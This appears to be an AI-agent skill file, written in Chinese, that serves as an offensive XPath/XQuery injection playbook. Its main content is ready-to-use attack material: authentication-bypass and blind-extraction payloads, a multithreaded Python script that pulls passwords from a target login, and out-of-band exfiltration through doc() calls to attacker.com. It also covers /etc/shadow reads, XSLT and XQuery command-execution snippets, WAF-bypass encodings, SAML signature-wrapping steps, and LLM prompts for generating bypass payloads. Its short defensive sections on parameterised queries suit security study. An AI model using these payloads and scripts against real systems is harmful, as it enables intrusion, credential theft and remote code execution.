---
name: xpath-injection-testing
description: XPath/XQuery注入深度攻防专业技能：认证绕过、盲注高效提取（二分/字符集二分/位运算/超时外带/OAST）、任意节点读取完整攻击链、XPath 1.0/2.0/3.1差异、XQuery注入面（BaseX/eXist/MarkLogic）、XML安全联动（XXE/XInclude/XSLT RCE）、现代语言库差异（Python lxml/Java XPathFactory/PHP DOMXPath/.NET XPathNavigator）、WAF绕过、SAML/SSO认证滥用（XSW签名包装）、信息泄露→敏感数据提取攻击链（CVE-2026-53582/CVE-2026-44962）、AI大模型辅助攻防
metadata:
  version: 3.0.0
---

# XPath/XQuery注入深度攻防技能

> **AI LOAD INSTRUCTION**: XPath/XQuery 注入深度测试（v3.0 深攻防版）。覆盖认证绕过、高效盲注提取（二分/字符集二分/位运算/超时外带/OAST）、XPath 1.0/2.0/3.1 与 XQuery 注入面差异、XSLT RCE 联动、SAML XSW 签名包装滥用及现代语言库差异。基础注入语法按已知前提，聚焦高阶提取、绕过与联动利用链。

## 概述

XPath注入（CWE-643）与SQL注入同源：应用将用户输入直接拼接进XPath表达式，攻击者通过注入XPath语法修改查询逻辑，导致认证绕过、越权读取XML文档任意节点。XPath是W3C标准语言、无方言差异、无权限模型——一旦注入成功即可读取整个XML文档（无GRANT/REVOKE），危害面远超SQL注入。XPath 2.0/3.1与XQuery（CWE-652）支持文件读取、集合访问、高阶函数，原生XML数据库（BaseX/eXist/MarkLogic）风险更高；叠加XSLT可实现服务器端RCE。本技能系统化覆盖**注入点发现→认证绕过→结构枚举→盲注高效提取→任意节点读取→SAML/SSO滥用→XML联动（XXE/XInclude/XSLT）→WAF绕过→AI辅助**完整攻防链路，并纳入2025-2026年最新实战案例（CVE-2026-44962 Plesk、CVE-2026-53582 OPNsense、CVE-2026-49289 simplesamlphp等）。

### 核心概念
- `//user[username='INPUT' and password='INPUT']`：XPath注入的典型脆弱形态——字符串拼接
- 注入本质：将"数据"提升为"代码"，闭合字符串定界符后改写表达式结构
- 永真条件（Tautology）：`' or '1'='1` 使谓词恒真，实现认证绕过
- 盲注（Blind XPath）：无回显时通过布尔差异/时间差异逐字符推断数据
- XPath版本：1.0（最广泛，无参数化标准机制）→ 2.0（类型系统+doc()文件读取）→ 3.0/3.1（maps/arrays/高阶函数/JSON）
- XQuery：XPath超集，可执行FLWOR循环、外部变量绑定，是原生XML数据库的查询语言
- XSLT：用户可控样式表时可触发扩展函数RCE

### 与SQL注入的核心差异（决定打法）
| 维度 | SQL注入 | XPath注入 |
|------|--------|----------|
| 权限模型 | 有用户/GRANT/REVOKE隔离 | **无权限模型，一次注入=全文档泄露** |
| 联合查询 | UNION关键字 | **无UNION**，用`\|`运算符组合多路径 |
| 注释符号 | `--`/`#`/`/* */` | **标准无注释语法**（`/**/`对XPath无效，与SQL不同） |
| 字符串定界 | 通常单引号 | 单引号或双引号均可，需两者都测 |
| 参数化支持 | PreparedStatement成熟 | XPath 1.0多数实现无参数化，靠转义或变量解析器 |
| 方言差异 | 有（MySQL/Oracle/...） | **标准语言零方言**，Payload可自动化复用 |
| 回显机制 | 有UNION回显/报错注入 | 多为布尔型盲注，报错信息常被吞 |
| 数据范围 | 受限于表/库权限 | 整个XML文档树（含属性、注释、处理指令） |

## 一、攻击面与注入点

### 1.1 注入点全景
| 场景 | 示例查询 | 危害等级 |
|------|---------|---------|
| 用户登录（XML用户库） | `//user[username/text()='INPUT' and password/text()='INPUT']` | 严重（认证绕过） |
| 用户/商品搜索 | `//user[contains(name,'INPUT')]` | 高（数据泄露） |
| 数据查询 | `/products/category[@name='INPUT']/item` | 高 |
| 权限检查 | `//user[@id='INPUT']/isAdmin/text()` | 严重（越权） |
| XML配置解析 | 动态XPath读取配置值 | 高（配置含密钥/凭据） |
| SOAP/XML Web Service | Web Service中XPath查询 | 高 |
| SAML断言解析 | XPath提取NameID/Attribute | 严重（SSO认证绕过） |
| XSLT转换参数 | 用户输入嵌入XSLT | 严重（可能RCE） |
| XML数据库（BaseX/eXist/MarkLogic） | XQuery/XPath查询 | 严重（CWE-652） |
| 文档管理系统 | XPath检索XML文档 | 中高 |
| APT/防火墙管理面（OPNsense等） | XPath操作config.xml | 严重（CVE-2026-53582） |
| 低代码/SaaS目录（Plesk APS等） | XPath搜索应用目录 | 严重（CVE-2026-44962，XPath→RCE） |

### 1.2 XPath特殊字符
```
'        字符串定界
"        字符串定界
/        路径分隔
//       任意深度后代
*        通配符（任意节点）
@        属性前缀
[]       谓词（条件）
|        多路径（XPath的"UNION"）
()       分组
.        当前节点
..       父节点
and or   逻辑运算（=为比较，AND优先级高于OR）
= !=     比较
< > <= >= 比较（XML文档中需转义&lt; &gt;）
+ - * div mod 算术（除法用div，*为通配符/乘法需上下文）
:        命名空间
comment() 注释节点
text()   文本节点
node()   任意节点
```

### 1.3 注入点识别要点
- **参数扫描**：所有进入XPath求值函数的参数（`xpath()`/`evaluate()`/`selectNodes()`/`query()`/`SelectSingleNode()`）
- **输入法**：`'` 触发语法错误/空响应 → 候选注入点；`' or '1'='1` 返回异常多数据 → 确认
- **盲注判定**：构造真/假条件观察响应差异（登录成功/失败、页面长度、状态码）
- **注意**：XPath字符串比较区分大小写；XML属性值中`<`、`>`、`&`需实体编码

## 二、XPath语言基础

### 2.1 常用轴
```
/              根节点
//             任意深度
.              当前节点
..             父节点
@attr          属性
node()         任意节点
text()         文本节点
*              任意元素节点
@*             任意属性
ancestor::     祖先（可用于读上层数据）
parent::       父节点
child::        子节点
following-sibling::  后面的兄弟
preceding-sibling::  前面的兄弟
ancestor-or-self::   祖先及自身
```

### 2.2 运算符和函数（XPath 1.0/2.0）
```
and or not()    逻辑
= != < > <= >=  比较
+ - * div mod   算术
contains(), starts-with(), ends-with(), matches()(2.0)
substring(), string-length(), concat(), normalize-space()
translate()     字符串替换（1.0即可构造任意字符串）
count(), sum(), position(), last()
name(), local-name(), namespace-uri()
string(), number(), boolean()
doc(), doc-available()(2.0 文件/URL读取)
unparsed-text() (2.0 读取外部文本文件)
collection()    (2.0 集合访问)
true() false()  布尔
```

### 2.3 XPath 3.0/3.1 新特性与攻击价值（W3C Rec 2014/2017）
```
# 数据类型：maps 与 arrays（支持JSON数据模型）
map{'k': 'v'} 或 map:merge(...)      # map构造
[1, 2, 3]                            # array构造
? 查找运算符：$m?k、$arr?1、$arr?*  # 取值

# 新运算符
|| 字符串连接          # 'a' || 'b' → 'ab'
!  简单映射            # //user ! name(.)  不排序不去重
=> 箭头运算符（函数链） # $in => substring-before(' ') => upper-case()

# 高阶函数（first-class functions）
fn:for-each(seq, fn)、fn:filter(seq, fn)、fn:fold-left()、fn:fold-right()
function($x) { ... } 内联匿名函数；$f() 动态函数调用
# 数组函数：array:size() array:get() array:subarray() array:sort() ...

# 攻击价值
1. || 与 fn:codepoints-to-string() 构造被过滤的敏感字符串
2. 高阶函数 + 动态调用在过滤严格时提供替代写法
3. maps/arrays 是eXist/BaseX/MarkLogic等原生XML数据库的默认模型（见第七章）
```
**工程提示**：XPath 3.x 仅在 Saxon-HE、BaseX、eXist、MarkLogic、Altova 等实现中可用；大部分Web应用仍是1.0，Payload需按目标实现降级适配。

## 三、认证绕过

### 3.1 经典认证绕过
原始查询：`//user[username/text()='INPUT_USER' and password/text()='INPUT_PASS']`

```
用户: ' or '1'='1
密码: ' or '1'='1
→ //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
→ 永真，返回第一个用户（通常为admin）

用户: ' or 1=1 or '
密码: 任意
→ 同上，1=1数值比较

用户: ']|//*|xxx['
→ 闭合谓词并联合所有节点（见第四章）

用户: admin' or 'a'='b
密码: ' or '1'='2
→ 联合控制逻辑顺序（利用AND优先级高于OR）

用户: ' or string-length(password)>0 or '
→ 查询密码非空的用户（信息泄露辅助）

用户: ' or //user[username='admin'] or '
→ 直接锁定admin
```

### 3.2 双引号场景
```
# 查询使用双引号: //user[username="INPUT" and password="INPUT"]
用户: " or "1"="1
密码: " or "1"="1
```

### 3.3 高级认证绕过变体
```
# 谓词内注入（不依赖引号闭合）
# 原始: //user[@id='INPUT']
输入: 1] or true() or ['1'='1
→ //user[@id='1'] or true() or ['1'='1']  → 永真

# 注入位置为数值/无引号上下文
输入: 1 or 1=1
→ //user[@id=1 or 1=1]

# 提取管理员口令hash（认证逻辑复用）
' or 1=1 and starts-with(//user[1]/password,'$2y') or '
```
**要点**：认证绕过常与信息泄露联动——绕过后返回的第一个节点往往携带role/权限字段，直接构成越权。

## 四、数据提取：从注入到任意节点读取完整链

### 4.1 Union风格（XPath无UNION，用 | 组合多路径）
```
']|/ |//*|foo['
# 返回根节点所有数据

']|/*|foo['
# 返回根下所有子节点

']|//user|//password|foo['
# 返回所有用户和密码

']|//@*|//text()|//comment()|foo['
# 属性+文本+注释全量
```

### 4.2 结构枚举完整链（盲打时重建文档树）
```
步骤1 探测根节点名
' or name(/*)='users 或 ' or starts-with(name(/*),'u')

步骤2 统计节点规模
' or count(//*)>N
' or count(//user)>0

步骤3 逐节点枚举名称（结合name()与position()）
' or name(//*[position()=5])='password
' or name(//user[2]/*[3])='secret_key

步骤4 读取任意节点值
' or string(//*[contains(name(),'token')])='xxx
' or //user[username='admin']/password='xxx

步骤5 全量输出（XPath 2.0 一键拼接）
' or string-join(//*/concat(name(),'=',string(.)),'\n')=' 
' or string-join(//user/concat(username,':',password),'|')='
```
**完整攻击链**：注入点发现 → 根节点指纹 → 节点规模统计 → 名称枚举（结构重建）→ 定位敏感节点（token/secret/password/privateKey）→ 逐值提取。此链同样适用于后续第十二章的SAML/config.xml场景。

### 4.3 XPath 2.0 doc()/unparsed-text() 文件读取
```
# doc()加载外部XML/URL（若实现启用）
doc('file:///etc/passwd')
doc('http://attacker.com/data.xml')

# unparsed-text()读取任意文本文件
unparsed-text('file:///etc/passwd')
unparsed-text('file:///etc/shadow')

# 注入使用：
user=xxx'] | doc('file:///etc/passwd') | //*[foo='bar
```
**注意**：`doc()`/`unparsed-text()`/`collection()`是否可用取决于实现（Saxon默认受限；eXist/BaseX需权限配置），务必先探测`doc-available()`。

## 五、盲注数据提取

### 5.1 布尔盲注基础
```
# 判断根节点名称（页面差异即真/假）
' or name(/*)='users
' or starts-with(name(/*),'u')

# 逐字符提取
' or substring(//user[1]/username,1,1)='a
' or substring(//user[1]/password,1,1)='a

# 与运算合并条件（一次请求多条件）
' or (substring(//user[1]/password,1,1)='a' and string-length(//user[1]/password)=8) or '
```

### 5.2 高效提取：二分长度 + 字符集二分（实战首选）
```
# 长度二分（log2(300)≈9次请求）
' or string-length(//user[1]/password)>=150 or '

# 字符集二分（每次请求排除一半候选字符）
# 判断第pos位字符是否在候选子集half中：
' or contains('{half}', substring(//user[1]/password,{pos},1)) or '

# 例：候选串 "abcdefghijklmnopqrstuvwxyz" 取前13位判断
' or contains('abcdefghijklmn', substring(//user[1]/password,5,1)) or '
# 真 → 字符在前半，缩半继续；假 → 在后半
# 直至子集收缩到1个字符，再用精确相等确认
' or substring(//user[1]/password,5,1)='m' or '
```
**效率对比**：线性逐字符（约95次/字符）vs 字符集二分（约7次/字符）vs 长度二分（9次总长），大文本提取效率提升一个数量级。

### 5.3 位运算提取（XPath 2.0，每bit一个条件）
```
# 将字符的Unicode码点按bit拆解，7个布尔条件锁定一个ASCII字符
# fn:string-to-codepoints() 取得码点c，判断第k位：
' or (string-to-codepoints(substring(//user[1]/password,1,1))[1] mod 128)>=64 or '
' or (string-to-codepoints(substring(//user[1]/password,1,1))[1] mod 64)>=32 or '
# ... 依次用 mod/div 判断各位，7次请求=1字符
# 或直接码点二分：
' or string-to-codepoints(substring(//user[1]/password,1,1))[1]>=128 or '
```

### 5.4 时间盲注与超时外带
XPath 1.0本身无sleep函数，通过以下手段制造可观测延迟：
```
# 1) doc()访问不可达/过滤地址（连接超时）
' or doc-available(concat('http://10.0.0.1:81/', //user[1]/username)) or '
' or doc-available(concat('http://127.0.0.1:', //user/id)) or '

# 2) 大计算量（XQuery可用FLWOR构造重计算）
for $i in (1 to 10000000) return $i   # BaseX/eXist场景

# 3) XSLT处理器中利用扩展/慢路径（Saxon extension等）

# 判定：真→延迟N秒，假→立即返回
```

### 5.5 OAST外带（Out-of-Band，攻击者服务器收数据）
```
# 攻击者起HTTP/DNS监听，将提取值拼入URL带出
' or doc(concat('http://attacker.com/', //user[1]/password)) or '
# 每次带出一个值（密码整体）；逐字符则用substring

# XQuery环境可用外部HTTP库（http:send-request）
http:send-request(<http:request href="http://attacker/{...}"/>)
```

### 5.6 自动化提取脚本（Python，字符集二分+多线程）
```python
import requests, string
from concurrent.futures import ThreadPoolExecutor

target = "http://target.com/login"
charset = sorted(set(string.printable) - set("'\"\\\r\n\t"))
xpath = "//user[1]/password"

def probe(cond):
    payload = f"x' or ({cond}) or 'x'='"
    r = requests.post(target, data={"user": payload, "pass": "x"}, timeout=10)
    return "Login success" in r.text  # 依目标调整判定特征

# 1) 长度二分
lo, hi = 0, 512
while lo < hi:
    mid = (lo + hi + 1) // 2
    if probe(f"string-length({xpath})>={mid}"):
        lo = mid
    else:
        hi = mid - 1
length = lo
print(f"[*] length = {length}")

# 2) 逐字符：字符集二分（每个字符约log2(95)≈7次请求）
def extract(pos):
    cands = charset
    while len(cands) > 1:
        half = len(cands) // 2
        half_str = "".join(cands[:half])
        if probe(f"contains('{half_str}', substring({xpath},{pos},1))"):
            cands = cands[:half]
        else:
            cands = cands[half:]
    return cands[0]

with ThreadPoolExecutor(max_workers=8) as pool:  # 注意后端并发容忍度
    chars = list(pool.map(extract, range(1, length + 1)))
print("".join(chars))
```
**OPNsense真实利用参考**：CVE-2026-53582即采用"二分长度 + contains字符集二分 + 线程池并发"提取config.xml中WireGuard私钥/root密码哈希，全部请求仅依赖一次存储型注入点。

## 六、XPath 2.0/3.1 高级利用

### 6.1 文件/网络读取函数矩阵
```
doc('file:///etc/passwd')          # XML文档（可解析节点）
doc-available('file:///...')       # 探测文件是否存在（布尔型）
unparsed-text('file:///etc/passwd')# 任意文本文件
unparsed-text-lines(...)           # 按行返回
collection('/path')                # 目录/集合遍历
# 注意：file://协议在部分实现中禁用，可用 http:// 内网探测（SSRF风味）
```

### 6.2 maps/arrays/高阶函数注入价值
```
# 用 || 与 codepoints-to-string 构造被WAF过滤的字符串
' or //user[username=('a'||'d'||'m'||'i'||'n')] or '
' or //user[username=codepoints-to-string(97,100,109,105,110)] or '

# 动态调用与for-each遍历输出（XQuery/3.x）
' or fn:string-join(//user ! (name() || '=' || string(.)), '\n') or '
' or for-each(//user, function($u){ $u/username || ':' || $u/password }) or '
```
**价值**：现代实现（BaseX/eXist/MarkLogic/Saxon）中3.x特性可显著简化批量提取，并绕过基于关键词（concat/string-join）的粗粒度WAF。

## 七、XQuery表达式注入面（CWE-652）

### 7.1 XQuery与XPath关系
XQuery是XPath的超集：XPath表达式本身即合法XQuery，另加FLWOR循环、类型转换、函数库、外部变量。凡用XQuery处理XML数据库的应用（`for $x in ... return ...`模式）都存在注入面，编码CWE-652（父类CWE-91，子类CWE-943）。已知CVE：CVE-2023-28676（CVSS 8.8）、CVE-2023-25015。

### 7.2 XML数据库攻击面（BaseX/eXist/MarkLogic）
```
# BaseX REST服务（默认http://localhost:8080/rest/）
GET  /rest?query=count(.)                      # 直接执行XQuery
GET  /rest?command=show+users                  # 执行数据库命令（用户枚举）
GET  /rest?run=eval.xq                         # 执行服务器端XQuery文件
POST /rest  body=<query>...</query>            # POST执行

# eXist-db REST（/exist/rest/db/...）+ XQuery执行
# MarkLogic /v1/eval 接口直接POST XQuery
```

### 7.3 XQuery注入Payload
```
# 基础探测
' or '1'='1
') or ('1'='1

# FLWOR批量导出（经典）
' or 1=1 return $x || ''
for $x in doc("users.xml")//user return $x

# 认证绕过
for $u in //user[username='' or '1'='1' and password='x'] return $u

# 变量/环境信息（可利用实现扩展函数）
' or (fn:environment-variable('PATH')) or '        # 环境变量
' or (fn:doc-available('file:///etc/shadow')) or ' # 文件存在探测
' or (basex:system() ) or '                        # BaseX系统信息（实现特定）
```

### 7.4 XQuery → RCE（实现特定）
```
# BaseX: 无默认命令执行扩展；但支持Java集成（modules）
import module namespace os = "java:java.lang.ProcessBuilder";
os:start(os:new(("bash", "-c", "id")))

# eXist: 通过EXPath包管理/内部模块，或结合存储过程
# MarkLogic: 禁用的外部库（xdmp:spawn）等
```
**要点**：XQuery RCE高度依赖实现与配置，优先走"数据泄露→凭据→横向"而非强行RCE；XML数据库常与SSO/LDAP集成，泄出的凭据价值极高。

## 八、XML安全联动：XXE/XInclude/XSLT

### 8.1 XXE 与 XPath 联动
当注入点位于**XML文档结构**（而非查询字符串）时，可注入DTD实体：
```
<?xml version="1.0"?>
<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```
```
# 组合拳：先XXE读配置 → XPath查询新数据 → 二次注入
# 场景：SOAP接口、SAML断言注入、XML上传解析
# 防护注意：即使禁用XXE，XInclude仍可能开启（见8.2）
```

### 8.2 XInclude 文件读取
```
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```
与XPath注入联动：注入点闭合后追加`<xi:include>`内容，或利用XPath查询的XML参数注入XInclude payload；`parse="text"`可读任意文本文件。

### 8.3 XSLT服务器端RCE（保留深化）
若用户输入能控制XSLT样式表或样式表参数，扩展函数直接RCE：
```xml
<!-- Java XSLT (Xalan) Runtime.exec -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
<xsl:template match="/">
  <xsl:variable name="rtObj" select="rt:getRuntime()"/>
  <xsl:variable name="exec" select="rt:exec($rtObj,'id')"/>
  Command executed!
</xsl:template>
</xsl:stylesheet>

<!-- PHP XSLT -->
<xsl:value-of select="php:function('system','id')"/>

<!-- Saxon/Java 文件写入 -->
<xsl:variable name="f" select="new java.io.FileWriter('/tmp/shell.php')"/>
```
**攻击链**：XPath注入点若暴露XSLT渲染（搜索/报表/导出功能），注入`<xsl:stylesheet>`片段触发模板加载 → 扩展函数RCE。Plesk CVE-2026-44962（CVSS 9.9）即展示XPath注入在真实产品中一路通向OS命令执行。

## 九、现代语言库差异与利用

| 语言/库 | XPath求值入口 | 参数化支持 | 注入利用注意点 |
|--------|--------------|-----------|--------------|
| Python lxml | `etree.XPath()`/`element.xpath()` | 支持变量绑定`$var` | 扩展函数可注册；`extensions`可被滥用 |
| Python xml.etree | `ElementTree`弱XPath | 无 | 仅1.0子集，注入面有限 |
| Java JAXP | `XPathFactory.newInstance().newXPath().evaluate()` | 需`XPathVariableResolver` | Xalan vs Saxon扩展函数差异大 |
| PHP | `DOMXPath::query()`/`evaluate()` | 无原生参数化 | 需手动转义；`registerPhpFunctions()`危险 |
| .NET | `XPathNavigator.Select()/Evaluate()`、`SelectSingleNode()` | 无内置（可用`XslCompiledTransform`+`XsltArgumentList`） | LINQ to XML相对安全 |
| Node.js | `xpath`库+`xmldom`/`@xmldom/xmldom` | 部分支持 | 解析器差异（如xmldom历史CVE） |
| BaseX/eXist | REST+XQuery | 外部变量绑定成熟 | 见第七章 |

### 9.1 Python lxml（审计要点）
```python
# 脆弱：字符串拼接
xpath = f"//user[name='{username}' and password='{password}']"
doc.xpath(xpath)

# 安全：变量绑定（数据与查询分离）
doc.xpath("//user[name=$u and password=$p]", u=username, p=password)

# 高危：注册扩展函数（等价于XSLT扩展）
from lxml import etree
def evil(ctx, arg): return os.popen(arg).read()
etree.FunctionNamespace("urn:evil")["exec"] = evil
doc.xpath("//a[evil:exec('id')]", namespaces={"evil": "urn:evil"})
```

### 9.2 Java XPathFactory（审计要点）
```java
// 脆弱：字符串拼接（CVE高发模式）
String expr = "//user[username='" + username + "' and password='" + password + "']";

// 安全：XPathVariableResolver 参数化
XPath xpath = XPathFactory.newInstance().newXPath();
xpath.setXPathVariableResolver(new SimpleVariableResolver());
String expr = "//user[username=$user and password=$pass]";
xpath.evaluate(expr, doc, XPathConstants.NODESET);

// 注意：Saxon实现支持更多扩展（EXPath file模块等）
```

### 9.3 PHP DOMXPath（审计要点）
```php
// 脆弱
$q = "//user[name='{$_POST['user']}' and pass='{$_POST['pass']}']";
$xpath->query($q);

// 缓解：转义单引号
$user = str_replace("'", "&apos;", $_POST['user']);

// 高危：注册PHP函数（php:function('system',...)）若可被用户触发XSLT
```

### 9.4 .NET XPathNavigator（审计要点）
```csharp
// 脆弱
string q = $"//user[username='{user}' and password='{pass}']";
nav.Select(q);

// .NET无内置XPath参数化；安全写法：先取节点再比较值
// 或 XslCompiledTransform + XsltArgumentList 参数绑定
```
**审计通用信号**：`+ user`、`+ password`、`$"//..."`、`f"//..."`、`sprintf("//%s")`拼接进XPath求值函数，均为CWE-643信号。

## 十、WAF绕过

### 10.1 编码绕过
```
# XML/HTML实体编码（WAF未解码即匹配失败）
' or &#97;='a          # 十进制
' or &#x61;='a         # 十六进制
&apos;                  # XML实体' 
&quot;                  # XML实体"
' or &#x31;&#x3d;&#x31; or '   # '1'='1整体编码

# URL双重编码（%2527）
'%2527%2520or%25201%253d1%2520or%2520%2527
```

### 10.2 等价表达式（语义等价，特征不同）
```
' or 1=1 or '           # 数值永真
' or true() or '        # 函数永真
' or 'a'='a or '        # 字符串永真
' or not(not(//user)) or '      # 双重否定
' or count(//user)>0 or '       # 计数判断
' or 'a'=translate('b','b','a') or '   # translate构造
' or 'a'=concat('','a') or '
' or '1' eq '1' or '    # XPath 2.0 eq运算符
' or (//user) or '      # 节点集转布尔（存在即真）
```

### 10.3 词法/空白绕过
```
# XPath词法允许token间任意空白（空格/TAB/换行），可打散关键字
' or '1' = '1' or '
' or '1' = '1' or '
# 注意：XPath标准无注释语法（/**/为SQL专属），勿在XPath中使用

# 通配符/局部名绕过节点名过滤
/*[starts-with(name(),'u')]            # user节点
//*[contains(text(),'admin')]          # 任意文本含admin
/*[local-name()='users']/*[local-name()='user']   # 忽略命名空间
```

### 10.4 字符串过滤绕过（防"单引号"被滤）
```
# concat拼接（XPath 1.0/2.0）
' or //user[username=concat('ad','min')] or '

# 逐字符数组拼接（2.0）
' or //user[username=string-join(('a','d','m','i','n'),'')] or '

# codepoints-to-string（2.0，对数字/WAF最友好）
' or //user[username=codepoints-to-string(97,100,109,105,110)] or '

# translate变体（1.0可用）
' or //user[username=translate('xxxadminxxx','x','')] or '
```

### 10.5 流量层绕过
- Content-Type混淆（`application/json`、`multipart/form-data`包裹、`text/plain`）
- 分块传输（chunked）拆分关键字
- 双层编码（应用先decode再拼查询）
- HTTPS/Gzip压缩传输，WAF不解压
- 参数污染（HPP）：同一参数多次出现，WAF看一个应用取另一个

## 十一、XPath注入在SAML/SSO中的滥用

### 11.1 SAML中的XPath使用
SP（服务提供方）解析SAML Response时用XPath提取身份字段：
```
//saml:Assertion/saml:Subject/saml:NameID
//saml:Assertion/saml:AttributeStatement/saml:Attribute
//saml:Response/saml:Assertion[1]
```
若解析逻辑使用**文档级XPath**（`//...`按文档顺序取第一个匹配）而非**签名覆盖子树内查询**，即产生认证绕过。

### 11.2 文档级XPath缺陷（CVE-2026-18092实战）
Perl Net::SAML2 <0.86：`new_from_xml`用`//saml:Assertion/...`取NameID/Attribute（文档顺序第一个），而XML::Sig只验证签名Reference URI指向的子树。攻击者持有任一IdP签名断言，即可在其**文档序之前**插入自建未签名断言 → 签名仍验证通过 → SP采用攻击者的NameID/属性 → 任意用户冒充。CVSS 8.1。
```
# 测试方法
1. 捕获一个合法签名的SAML Response
2. 在文档中插入第二个未签名Assertion（置于签名元素之前）
3. 观察SP是否采用插入断言中的身份/角色
```

### 11.3 XSW签名包装攻击（XML Signature Wrapping）
签名验证与业务处理用不同解析器/不同视图时，通过**包装**保留签名、替换消费数据：
- 双根/多根包装：在`<Response>`外再包一层，或复制`<Assertion>`副本
- 元素替换：签名的`<Reference URI="#id">`指向的元素替换为攻击者元素（ID属性重用）
- Void Canonicalization / 属性污染：利用规范化和命名空间解析差异（Black Hat EU 2025 "The Fragile Lock"）
- 属性轮子：借合法签名的id，将`<Attribute>`内容替换后重放

### 11.4 2025-2026 SAML/XML XPath相关漏洞速查
| CVE | 组件 | 危害 | 要点 |
|-----|------|------|------|
| CVE-2026-18092 | Perl Net::SAML2 <0.86 | 认证绕过（CVSS 8.1） | 文档级XPath读身份 |
| CVE-2025-25291/25292 | ruby-saml | 认证绕过 | Nokogiri解析器差异（XSW） |
| CVE-2026-49289 | simplesamlphp/saml2 <4.20.3 | DoS（CVSS 8.7） | XPath Transform过程注入 |
| CVE-2026-46490 | samlify <2.13.0 | 提权（CVSS 8.8） | AttributeValue未转义注入 |
| CVE-2026-55789 | Logto <1.41.0 | 提权 | SAML模板字符串替换注入 |
| CVE-2026-40165 | authentik | 认证绕过 | NameID XML注释注入 |

### 11.5 SAML测试方法
```
1. SAMLResponse参数Base64解码→修改→重编码发送（XML注释/属性/断言注入）
2. 注入点候选：NameID、AttributeValue、AudienceRestriction、SessionIndex
3. XPath注入探测：NameID中注入 ' or '1'='1 观察身份变化
4. XSW：插入副本断言/双根/ID重用，观察是否接受
5. 属性提权：role/group/admin字段注入新值（如 samlify CVE-2026-46490）
```
**注意**：SAML断言多被压缩（`<samlp:Response>` + deflate），先解压再修改；测试请使用专属测试IdP。

## 十二、信息泄露→敏感数据提取完整攻击链

### 12.1 攻击链总览
```
信息收集(注入点/文档结构指纹)
  → 认证绕过(永真条件)
    → 结构枚举(根节点/节点名/属性)
      → 定位敏感数据(token/密钥/口令哈希/凭据)
        → 盲注高效提取(二分/字符集二分/OAST)
          → 凭据复用/横向 / 写配置节点 / 结合XSLT→RCE
```

### 12.2 实战案例：OPNsense CVE-2026-53582（存储型XPath注入→全配置泄露）
- **漏洞点**：`count(Config::getInstance()->object()->xpath("//*[text()='{$node->refid}']"))`，refid用户可控且无格式校验
- **影响**：仅需CA/证书管理权限，即可泄漏config.xml中WireGuard私钥、root口令哈希、API Key/Secret、OpenVPN密钥（`//system/user/password`、`//system/user/apikeys/item/secret`等XPath目标）
- **利用流程**：
```
1. POST /api/trust/ca/add 写入可控refid（存储型注入点）
2. 用 ca/refid='<payload>' 构造布尔oracle：
   payload = f"{nx}' or ({condition}) or 'x'='"
3. 条件真→refcount>0（通过ca/get接口观测）
4. 二分长度 + contains字符集二分逐字符提取任意XPath节点值
5. 多线程并发加速（参考5.6脚本）
```
- **启示**：防火墙/网关/管理面板的config.xml是XPath注入的高价值靶标；存储型注入点可反复利用形成稳定oracle。

### 12.3 实战案例：Plesk CVE-2026-44962（XPath注入→RCE，CVSS 9.9）
- **漏洞点**：APS Application Catalog搜索功能将用户输入直接拼入XPath查询（CWE-643）
- **影响**：低权限认证用户→任意OS命令执行→本地提权（CVSS 9.9：AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H）
- **启示**：XPath注入不是"只能读XML"——当查询结果/错误被带入后续处理（如XSLT渲染、命令参数）时，可升级为RCE。测试时关注：查询结果是否回显、是否经过模板/转换层、错误信息是否进入日志/命令。

### 12.4 高价值目标XPath速查
```
//system/user/password                 # 口令哈希
//system/user/apikeys/item/secret      # API密钥
//OPNsense/wireguard/server/.../privkey# 私钥
//config/credentials/...               # 通用配置凭据
//*/@*                                 # 全属性（常含id/token）
```

## 十三、AI大模型结合

### 13.1 AI辅助生成XPath payload
```
# 示例提示词（注入点上下文→payload）
"目标XPath查询: //user[username='%s' and password='%s']（Java XPathFactory，XPath 1.0）。
 请生成：1)认证绕过payload 2)布尔盲注提取password的payload 3)WAF存在时（拦截'or'与'1=1'）的等价绕过。输出可直接提交的表单值。"

# 示例提示词（盲注脚本生成）
"基于布尔盲注，目标判定特征为'Login success'关键字，提取//user[1]/secret。
 用Python生成：二分长度+字符集二分+8线程并发的提取脚本（requests库），
 注意引号转义与payload闭合为 x' or (cond) or 'x'='。"
```
**价值**：LLM可批量生成多形态等价表达式（translate/codepoints-to-string/嵌套函数）用于绕过特征WAF，并自动生成针对不同语言后端（lxml/XPathFactory/DOMXPath）的适配payload。

### 13.2 LLM审计XPath拼接代码（防侧）
```
# 提示词：对代码做CWE-643审计
"审计以下代码中所有XPath查询构造点，标记：1)用户输入是否直接拼接进查询字符串
 2)是否使用参数化/变量绑定 3)引号是否转义 4)给出修复代码。代码: ..."
```
**审计规则（LLM应遵循）**：任何`f"//...{input}..."`、`"...'"+input+"'..."`、`sprintf("//%s")`进XPath求值函数=信号；优先推荐变量绑定（lxml `$var`、Java `XPathVariableResolver`、XQuery `declare variable external`）。

### 13.3 AI驱动自动化检测
- **语义差异判定**：用LLM替代正则判断真假响应差异（正文变化/状态码/长度变化），提高盲注oracle鲁棒性
- **自适应payload生成**：根据WAF拦截响应自动迭代生成绕过变体（Agent式循环：发送→判断拦截→变形→重发）
- **文档结构推断**：喂入部分枚举结果，让LLM推断XML schema并预测敏感节点路径（大幅缩短第四章结构枚举）
- **多目标并行**：AI编排注入测试矩阵（引号/双引号/数字上下文/属性上下文）并汇总结果

### 13.4 注意事项
- **验证优先**：LLM生成的payload必须实际验证，防止幻觉语法（如XPath中误用SQL注释`/**/`、`--`）
- **版本对齐**：提示词中明确XPath版本与后端库，避免生成3.x特性用于1.0实现
- **合规约束**：AI生成的自动化工具同样仅限授权范围；在提示词与脚本中固化授权标记与限速参数

## 十四、工具链

| 工具 | 用途 |
|------|------|
| Burp Suite（Intruder+Active Scan） | 注入点发现、payload批量fuzz、SAML重放 |
| XCat | XPath盲注自动数据提取 |
| xxetri | XPath注入探测与利用 |
| xpath-blind-explorer | 盲注数据提取 |
| XSLT Fuzzer / xsltproc | XSLT转换与扩展函数测试 |
